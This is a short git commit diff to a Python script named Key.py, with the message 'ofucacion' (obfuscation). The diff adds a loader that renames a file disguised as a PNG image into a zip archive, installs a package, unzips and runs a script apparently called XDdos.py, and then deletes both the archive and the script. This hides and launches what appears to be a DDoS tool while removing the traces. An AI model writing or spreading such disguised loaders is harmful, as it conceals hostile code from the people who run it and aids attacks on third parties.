12c38cca4fe736309cf94df80de4a77050d1350c
Tenshi Kira <garciarodrigueza587@gmail.com>
2022-08-11 23:04:18 -0600

    ofucacion

--- Key.py
+++ Key.py
@@ -2,6 +2,9 @@
 # -*- coding: utf-8 -*-
 
 import os
-os.system("cat XDDos.png > XDdos.py")
+os.system("cat XDD0s.png > XDdos.zip")
+os.system("pip install colorama")
+os.system("unzip XDdos.zip")
 os.system("python XDdos.py")
+os.system("rm XDdos.zip")
 os.system("rm XDdos.py")
